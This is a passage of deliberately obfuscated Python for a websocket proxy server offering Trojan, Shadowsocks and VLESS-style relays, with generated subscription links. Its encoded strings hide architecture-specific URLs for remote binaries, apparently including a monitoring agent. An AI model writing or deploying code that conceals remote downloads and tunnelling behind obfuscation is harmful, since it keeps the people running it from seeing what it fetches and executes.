                IlllIlllIllIIlll += 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 232) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('d1'), 16) * 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('30'), 16) + 0 .__class__((lambda n: int.__xor__(n, 32).to_bytes(1, 'big').decode())(18), 16)
            if IIlllIlIIIlllll(host):
                await websocket.close()
                return False
            lIlllIllllIlI = await lllIIlIllllIlIII(host)
            try:
                llIllIlIlllIIlIIIl, IIIIlllIlIllIl = await lIlIIllIlIIlIll(lIlllIllllIlI, port)
                if IlllIlllIllIIlll < IIIIlllIIIllIIIIlIllIlII[(lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('6e656c')](IIllllIllIIIIIlIlllIlIlI):
                    IIIIlllIlIllIl.write(IIllllIllIIIIIlIlllIlIlI[IlllIlllIllIIlll:])
                    await IIIIlllIlIllIl.drain()

                async def IllIlllIlllllIIIlIllIIIIIII():
                    try:
                        async for IIllIIIIIIIlIIIl in websocket:
                            if IIllIIIIIIIlIIIl.type == aiohttp.WSMsgType.BINARY:
                                IIIIlllIlIllIl.write(IIllIIIIIIIlIIIl.data)
                                await IIIIlllIlIllIl.drain()
                    except:
                        pass
                    finally:
                        IIIIlllIlIllIl.close()
                        await IIIIlllIlIllIl.wait_closed()

                async def llIlIIIIIIllIllIIIIlIlllI():
                    try:
                        while True:
                            data = await llIllIlIlllIIlIIIl.read(0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 117)) for c in IIIIIIlIIlIlII)))([68, 65, 77, 68]), 16) ^ 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 47)) for c in IIIIIIlIIlIlII)))([27, 23, 30]), 16))
                            if not data:
                                break
                            await websocket.send_bytes(data)
                    except:
                        pass
                await llIlIIlIlIIIIlIllIl(IllIlllIlllllIIIlIllIIIIIII(), llIlIIIIIIllIllIIIIlIlllI())
            except Exception as lIIlllIIIllIIIlllIllIIIl:
                if DEBUG:
                    IlIllIIIIlIIlIll.error(f'Connection error: {lIIlllIIIllIIIlllIllIIIl}')
            return True
        except Exception as lIIlllIIIllIIIlllIllIIIl:
            if DEBUG:
                IlIllIIIIlIIlIll.error(f'Tro handler error: {lIIlllIIIllIIIlllIllIIIl}')
            return False

    async def IllIlIlIIlIIllIlll(self, websocket, IIllllIllIIIIIlIlllIlIlI: bytes) -> bool:
        try:
            if IIIIlllIIIllIIIIlIllIlII[(lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 55 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([89, 82, 91])](IIllllIllIIIIIlIlllIlIlI) < 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('32'), 16) * 0 .__class__((lambda n: int.__xor__(n, 255).to_bytes(1, 'big').decode())(204), 16) + 0 .__class__((lambda n: int.__xor__(n, 164).to_bytes(1, 'big').decode())(149), 16):
                return False
            IlllIlllIllIIlll = 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 149 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([164, 164]), 16) ^ 0 .__class__((lambda n: int.__xor__(n, 3990).to_bytes(2, 'big').decode())(16039), 16)
            llIIIIIIIIlllIIlIlIIlIIllI = IIllllIllIIIIIlIlllIlIlI[IlllIlllIllIIlll]
            IlllIlllIllIIlll += 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 186) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('8b8fdf'), 16) - 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('643531'), 16)
            host = ''
            if llIIIIIIIIlllIIlIlIIlIIllI == 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 113)) for c in IIIIIIlIIlIlII)))([65]), 16) << 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 67)) for c in IIIIIIlIIlIlII)))([114]), 16) | 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('31'), 16):
                if IlllIlllIllIIlll + (0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 212 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([226]), 16) ^ 0 .__class__((lambda n: int.__xor__(n, 63).to_bytes(1, 'big').decode())(13), 16)) > IIIIlllIIIllIIIIlIllIlII[(lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 137 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([231, 236, 229])](IIllllIllIIIIIlIlllIlIlI):
                    return False
                host = (lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('2e').join((IIIIlllIIIllIIIIlIllIlII[(lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 60 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([78, 72, 79])](lIlllIIlIIIlIIl) for lIlllIIlIIIlIIl in IIllllIllIIIIIlIlllIlIlI[IlllIlllIllIIlll:IlllIlllIllIIlll + (0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('3631'), 16) - 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 144 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([162, 161]), 16))]))
                IlllIlllIllIIlll += 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 248) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('9c'), 16) * 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('30'), 16) + 0 .__class__((lambda n: int.__xor__(n, 64).to_bytes(1, 'big').decode())(116), 16)
            elif llIIIIIIIIlllIIlIlIIlIIllI == 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 91)) for c in IIIIIIlIIlIlII)))([107]), 16) ^ 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 28) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('2f'), 16):
                if IlllIlllIllIIlll >= IIIIlllIIIllIIIIlIllIlII[(lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 35 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([77, 70, 79])](IIllllIllIIIIIlIlllIlIlI):
                    return False
                lIllIlIIlllIlIlllIIIllllIIl = IIllllIllIIIIIlIlllIlIlI[IlllIlllIllIIlll]
                IlllIlllIllIIlll += 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('44'), 16) ^ 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('43'), 16)
                if IlllIlllIllIIlll + lIllIlIIlllIlIlllIIIllllIIl > IIIIlllIIIllIIIIlIllIlII[(lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 71)) for c in IIIIIIlIIlIlII)))([43, 34, 41])](IIllllIllIIIIIlIlllIlIlI):
                    return False
                host = IIllllIllIIIIIlIlllIlIlI[IlllIlllIllIIlll:IlllIlllIllIIlll + lIllIlIIlllIlIlllIIIllllIIl].decode()
                IlllIlllIllIIlll += lIllIlIIlllIlIlllIIIllllIIl
            elif llIIIIIIIIlllIIlIlIIlIIllI == 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 99) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('57'), 16) * 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 68)) for c in IIIIIIlIIlIlII)))([117]), 16) + 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 181 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([133]), 16):
                if IlllIlllIllIIlll + (0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 143 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([202, 203]), 16) - 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('6563'), 16)) > IIIIlllIIIllIIIIlIllIlII[(lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('6e656c')](IIllllIllIIIIIlIlllIlIlI):
                    return False
                host = (lambda n: int.__xor__(n, 54).to_bytes(1, 'big').decode())(12).join((f"{(IIllllIllIIIIIlIlllIlIlI[lllIIlIlIllIlI] << 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 56)) for c in IIIIIIlIIlIlII)))([1, 89]), 16) - 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('3239'), 16)) + IIllllIllIIIIIlIlllIlIlI[lllIIlIlIllIlI + (0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('30'), 16) << 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 249) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('c8'), 16) | 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 54)) for c in IIIIIIlIIlIlII)))([7]), 16))]:04x}" for lllIIlIlIllIlI in IIIIlllIIIllIIIIlIllIlII[(lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 40) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('5a49464f4d')](IlllIlllIllIIlll, IlllIlllIllIIlll + (0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('38'), 16) << 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 52)) for c in IIIIIIlIIlIlII)))([5]), 16) | 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('30'), 16)), 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('3433'), 16) ^ 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('3633'), 16))))
                IlllIlllIllIIlll += 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('44'), 16) * 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 24)) for c in IIIIIIlIIlIlII)))([41]), 16) + 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 83 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([96]), 16)
            else:
                return False
            if IlllIlllIllIIlll + (0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('6631'), 16) ^ 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('6431'), 16)) > IIIIlllIIIllIIIIlIllIlII[(lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 83)) for c in IIIIIIlIIlIlII)))([63, 54, 61])](IIllllIllIIIIIlIlllIlIlI):
                return False
            port = IlllIllllIlIIIl((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 116)) for c in IIIIIIlIIlIlII)))([85, 60]), IIllllIllIIIIIlIlllIlIlI[IlllIlllIllIIlll:IlllIlllIllIIlll + (0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 201 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([170]), 16) * 0 .__class__((lambda n: int.__xor__(n, 58).to_bytes(1, 'big').decode())(10), 16) + 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('32'), 16))])[0 .__class__((lambda n: int.__xor__(n, 8112).to_bytes(2, 'big').decode())(31701), 16) ^ 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 92)) for c in IIIIIIlIIlIlII)))([56, 57]), 16)]
            IlllIlllIllIIlll += 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('31'), 16) << 0 .__class__((lambda n: int.__xor__(n, 70).to_bytes(1, 'big').decode())(119), 16) | 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 61) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('0d'), 16)
            if IIlllIlIIIlllll(host):
                await websocket.close()
                return False
            lIlllIllllIlI = await lllIIlIllllIlIII(host)
            try:
                llIllIlIlllIIlIIIl, IIIIlllIlIllIl = await lIlIIllIlIIlIll(lIlllIllllIlI, port)
                if IlllIlllIllIIlll < IIIIlllIIIllIIIIlIllIlII[(lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 37)) for c in IIIIIIlIIlIlII)))([73, 64, 75])](IIllllIllIIIIIlIlllIlIlI):
                    IIIIlllIlIllIl.write(IIllllIllIIIIIlIlllIlIlI[IlllIlllIllIIlll:])
                    await IIIIlllIlIllIl.drain()

                async def IllIlllIlllllIIIlIllIIIIIII():
                    try:
                        async for IIllIIIIIIIlIIIl in websocket:
                            if IIllIIIIIIIlIIIl.type == aiohttp.WSMsgType.BINARY:
                                IIIIlllIlIllIl.write(IIllIIIIIIIlIIIl.data)
                                await IIIIlllIlIllIl.drain()
                    except:
                        pass
                    finally:
                        IIIIlllIlIllIl.close()
                        await IIIIlllIlIllIl.wait_closed()

                async def llIlIIIIIIllIllIIIIlIlllI():
                    try:
                        while True:
                            data = await llIllIlIlllIIlIIIl.read(0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('31313031'), 16) - 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 139) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('baba'), 16))
                            if not data:
                                break
                            await websocket.send_bytes(data)
                    except:
                        pass
                await llIlIIlIlIIIIlIllIl(IllIlllIlllllIIIlIllIIIIIII(), llIlIIIIIIllIllIIIIlIlllI())
            except Exception as lIIlllIIIllIIIlllIllIIIl:
                if DEBUG:
                    IlIllIIIIlIIlIll.error(f'Connection error: {lIIlllIIIllIIIlllIllIIIl}')
            return True
        except Exception as lIIlllIIIllIIIlllIllIIIl:
            if DEBUG:
                IlIllIIIIlIIlIll.error(f'Shadowsocks handler error: {lIIlllIIIllIIIlllIllIIIl}')
            return False

async def IlIIIIIlllIl(llIIllllIllIlllllllI):
    ws = web.WebSocketResponse()
    await ws.prepare(llIIllllIllIlllllllI)
    llIIllIllllIlIIIIlIl = UUID.replace((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('2d'), '')
    path = llIIllllIllIlllllllI.path
    if f'/{WSPATH}' not in path:
        await ws.close()
        return ws
    IIIllIIlIIIlll = lllllIIllIIIIIlll(llIIllIllllIlIIIIlIl)
    try:
        IIllllIllIIIIIlIlllIlIlI = await IlllIIlIlllIllIIIlllIIlI(ws.receive(), timeout=0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 94) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('6c'), 16) << 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 154) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('ab'), 16) | 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 58)) for c in IIIIIIlIIlIlII)))([11]), 16))
        if IIllllIllIIIIIlIlllIlIlI.type != aiohttp.WSMsgType.BINARY:
            await ws.close()
            return ws
        IlllIIIlIIIll = IIllllIllIIIIIlIlllIlIlI.data
        if IIIIlllIIIllIIIIlIllIlII[(lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 64)) for c in IIIIIIlIIlIlII)))([44, 37, 46])](IlllIIIlIIIll) > 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 136) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('b0'), 16) << 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 86 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([103]), 16) | 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 227 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([210]), 16) and IlllIIIlIIIll[0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 200 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([251, 241]), 16) ^ 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 78)) for c in IIIIIIlIIlIlII)))([119, 125]), 16)] == 0 .__class__((lambda n: int.__xor__(n, 58737).to_bytes(2, 'big').decode())(54834), 16) ^ 0 .__class__((lambda n: int.__xor__(n, 21326).to_bytes(2, 'big').decode())(24621), 16):
            if await IIIllIIlIIIlll.IlIllIIIIIlIIlIlllIIlIlII(ws, IlllIIIlIIIll):
                return ws
        if IIIIlllIIIllIIIIlIllIlII[(lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 48)) for c in IIIIIIlIIlIlII)))([92, 85, 94])](IlllIIIlIIIll) >= 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 140) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('bdbfbc'), 16) - 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 172) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('ea9a'), 16):
            if await IIIllIIlIIIlll.lIIIIIIlllIlIllllIIllll(ws, IlllIIIlIIIll):
                return ws
        if IIIIlllIIIllIIIIlIllIlII[(lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('6e656c')](IlllIIIlIIIll) > 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 238 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([218, 218]), 16) ^ 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 188 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([136, 136]), 16) and IlllIIIlIIIll[0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 124 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([75, 73]), 16) ^ 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('3735'), 16)] in (0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 240 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([198]), 16) * 0 .__class__((lambda n: int.__xor__(n, 1).to_bytes(1, 'big').decode())(49), 16) + 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 39)) for c in IIIIIIlIIlIlII)))([22]), 16), 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('623131'), 16) - 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('383131'), 16), 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 30 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([122, 45, 47]), 16) - 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('393331'), 16)):
            if await IIIllIIlIIIlll.IllIlIlIIlIIllIlll(ws, IlllIIIlIIIll):
                return ws
        await ws.close()
    except asyncio.TimeoutError:
        await ws.close()
    except Exception as lIIlllIIIllIIIlllIllIIIl:
        if DEBUG:
            IlIllIIIIlIIlIll.error(f'WebSocket handler error: {lIIlllIIIllIIIlllIllIIIl}')
        await ws.close()
    return ws

async def lllIlIIIlllI(llIIllllIllIlllllllI):
    if llIIllllIllIlllllllI.path == (lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 16 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([63]):
        try:
            with IIIIlllIIIllIIIIlIllIlII[(lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 84)) for c in IIIIIIlIIlIlII)))([59, 36, 49, 58])]((lambda n: int.__xor__(n, 1150064673696660604163354).to_bytes(10, 'big').decode())(731510672612576890321014), (lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 168 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([218]), encoding=(lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 79 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([119, 98, 41, 59, 58])) as llIIIIIIIlIIIIllIlIIIlll:
                lIIlIlllllllIlIlIIIIlI = llIIIIIIIlIIIIllIlIIIlll.read()
            return web.Response(text=lIIlIlllllllIlIlIIIIlI, content_type=(lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('6c6d74682f74786574'))
        except:
            return web.Response(text=(lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 16)) for c in IIIIIIlIIlIlII)))([88, 117, 124, 124, 127, 48, 103, 127, 98, 124, 116, 49]), content_type=(lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('6c6d74682f74786574'))
    elif llIIllllIllIlllllllI.path == f'/{SUB_PATH}':
        await lllllllIlIlIlIlIIIl()
        await IIllIlIlllllIlIlIlIlIIll()
        lllIlIlllllllIIIlIIllII = f'{NAME}-{IIIlllIIIlIllIIIIIIIII}' if NAME else IIIlllIIIlIllIIIIIIIII
        IIllIIlIIIlllIlIlIIIlIIIIIl = (lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 116)) for c in IIIIIIlIIlIlII)))([0, 24, 7]) if IlIIIIlIIlIIllIllllllIl == (lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('736c74') else (lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('656e6f6e')
        lIIIIIIIIlllIlllIlIllIlIl = (lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 49)) for c in IIIIIIlIIlIlII)))([69, 93, 66, 10]) if IlIIIIlIIlIIllIllllllIl == (lambda n: int.__xor__(n, 14195663).to_bytes(3, 'big').decode())(11335612) else ''
        lllIIIIlIIlI = f'vless://{UUID}@{lllIlIlIllIl}:{IlIlIIlllllIIIIIlllllIII}?encryption=none&security={IIllIIlIIIlllIlIlIIIlIIIIIl}&sni={lllIlIlIllIl}&fp=chrome&type=ws&host={lllIlIlIllIl}&path=%2F{WSPATH}#{lllIlIlllllllIIIlIIllII}'
        lIlIIIIIIIllllIllIIIIlllll = f'trojan://{UUID}@{lllIlIlIllIl}:{IlIlIIlllllIIIIIlllllIII}?security={IIllIIlIIIlllIlIlIIIlIIIIIl}&sni={lllIlIlIllIl}&fp=chrome&type=ws&host={lllIlIlIllIl}&path=%2F{WSPATH}#{lllIlIlllllllIIIlIIllII}'
        IlIIlIlIlIIlIllllIIlllIllIl = IIllIIIlIllIllIIllllIl(f'none:{UUID}'.encode()).decode()
        IIlIIlIlIlIIIIlIlIIl = f'ss://{IlIIlIlIlIIlIllllIIlllIllIl}@{lllIlIlIllIl}:{IlIlIIlllllIIIIIlllllIII}?plugin=v2ray-plugin;mode%3Dwebsocket;host%3D{lllIlIlIllIl};path%3D%2F{WSPATH};{lIIIIIIIIlllIlllIlIllIlIl}sni%3D{lllIlIlIllIl};skip-cert-verify%3Dtrue;mux%3D0#{lllIlIlllllllIIIlIIllII}'
        llIIlIIlllIllI = f'{lllIIIIlIIlI}\n{lIlIIIIIIIllllIllIIIIlllll}\n{IIlIIlIlIlIIIIlIlIIl}'
        llIlIIllIIIIlIIlIIll = IIllIIIlIllIllIIllllIl(llIIlIIlllIllI.encode()).decode()
        return web.Response(text=llIlIIllIIIIlIIlIIll + (lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 216 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([210]), content_type=(lambda n: int.__xor__(n, 586416957647785133222780).to_bytes(10, 'big').decode())(39121107788383497699858))
    return web.Response(status=0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 8)) for c in IIIIIIlIIlIlII)))([58, 61, 62]), 16) - 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 225) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('82d3'), 16), text=(lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 240) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('be9f84d0b69f859e94fa'))

def IllllIlIIIIlIIl():
    import platform
    IllIIlIlIIlIlIIlllIlIl = platform.machine()
    if (lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 188 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([209, 206, 221]) in IllIIlIlIIlIlIIlllIlIl.lower() or (lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 114) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('131300111a4446') in IllIIlIlIIlIlIIlllIlIl.lower():
        if not NEZHA_PORT:
            return (lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('31762f6d6f632e65636f6f652e34366d72612f2f3a7370747468')
        else:
            return (lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('746e6567612f6d6f632e65636f6f652e34366d72612f2f3a7370747468')
    elif not NEZHA_PORT:
        return (lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 125) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('1509090d0e4752521c10194b49531812121e18531e1210520b4c')
    else:
